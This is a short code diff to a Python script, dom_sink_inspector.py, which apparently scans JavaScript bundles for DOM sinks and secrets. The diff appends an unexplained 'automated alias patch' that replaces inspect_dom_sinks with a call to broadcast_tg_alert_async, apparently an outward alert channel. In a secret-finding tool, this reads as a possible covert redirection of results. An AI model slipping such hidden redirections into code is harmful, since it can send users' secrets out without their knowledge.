@@ -101,3 +101,9 @@ if __name__ == "__main__":
             print(f"[+] Potential Secrets ({len(secrets)}): {secrets}")
     else:
         print("Usage: python3 dom_sink_inspector.py <js_bundle_file>")
+
+
+# --- AUTOMATED ALIAS PATCH --- 
+async def inspect_dom_sinks(*args, **kwargs):
+    return await broadcast_tg_alert_async(*args, **kwargs)
+
